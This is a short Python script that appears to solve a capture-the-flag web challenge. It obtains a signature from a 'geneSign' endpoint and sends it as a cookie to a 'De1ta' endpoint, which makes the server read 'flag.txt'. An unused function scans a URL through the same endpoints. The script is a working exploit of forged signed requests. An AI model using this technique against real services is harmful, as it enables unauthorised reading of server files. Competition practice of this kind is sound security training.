import requests
import os
import time
from Crypto.Hash import MD5
import random

geneSign = 'http://139.180.128.86/geneSign'
De1ta = 'http://139.180.128.86/De1ta'

# geneSign = 'http://127.0.0.1/geneSign'
# De1ta = 'http://127.0.0.1/De1ta'


def getMd5(content):
    return MD5.new(content).hexdigest()

def scan():
    # defining a params dict for the parameters to be sent to the API
    GENEPARAMS = {'param': 'http://139.180.128.86'}

    # sending get request and saving the response as response object
    r = requests.get(url = geneSign, params = GENEPARAMS)
    COOKIES = {'action': 'scan', 'sign': r.text}

    r = requests.get(url = De1ta, params = GENEPARAMS, cookies = COOKIES)

    print r.text

# scan()

def read():
    p = 'flag.txt'
    print(p)
    GENEPARAMS = {'param': p + 'read'}
    r = requests.get(url = geneSign, params = GENEPARAMS)

    COOKIES = {'action': 'readscan', 'sign': r.text}
    PARAMS = {'param': p}

    r = requests.get(url = De1ta, params = PARAMS, cookies = COOKIES)
    print r.text

read()
